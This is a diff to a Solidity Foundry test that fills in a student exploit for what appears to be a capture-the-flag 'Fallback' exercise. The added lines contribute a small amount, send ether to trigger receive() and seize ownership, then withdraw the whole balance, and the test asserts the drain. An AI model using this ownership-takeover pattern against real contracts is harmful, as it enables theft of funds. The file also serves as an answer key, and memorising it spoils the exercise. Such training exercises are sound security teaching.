@@ -18,21 +18,24 @@ contract FallbackTest is Test {
         vm.startPrank(student);
         
         // Contribute a small amount (less than 0.001 ether) to the contract
+        fallbackContract.contribute{value: 1}();
 
         // Send ether to the contract trigger receive() and become the owner
+        (bool s, ) = address(fallbackContract).call{value: 1}("");
+        require(s, "tx failed");
 
         // Withdraw all funds
+        fallbackContract.withdraw();
 
         vm.stopPrank();
     }
 
     function testStudentSolution() public {
         exploit();
-        
         verifySolution();
     }
 
-    function verifySolution() internal {
+    function verifySolution() internal view {
         assertEq(fallbackContract.owner(), student, "Ownership not transferred");
         assertEq(address(fallbackContract).balance, 0, "Contract balance not drained");
     }
